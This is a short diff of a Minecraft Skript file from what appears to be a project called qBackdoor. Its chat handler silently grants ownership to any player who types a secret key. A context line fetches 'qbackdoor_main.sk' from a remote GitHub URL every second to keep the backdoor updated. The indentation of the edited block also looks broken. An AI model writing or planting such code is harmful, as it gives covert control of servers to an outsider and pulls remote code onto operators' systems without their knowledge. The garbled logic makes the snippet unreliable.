@@ -160,11 +160,11 @@ on load:
 on chat:
   if message is {@key}:
     cancel event
-      if {alreadyset} is true:
-        set {qbd} to player's name
-        set {alreadyset} to true
-      else:
-        send "%{@prefix}% &cError while setting owner"
+    if {alreadyset} is false:
+      set {qbd} to player's name
+      set {alreadyset} to true
+  else:
+  send "%{@prefix}% &cError while setting owner" to player
 
 every second:
   download file from "https://raw.githubusercontent.com/iHategithub9000/qBackdoor/main/qbackdoor_main.sk" to file "latestbackdoor.tmp"
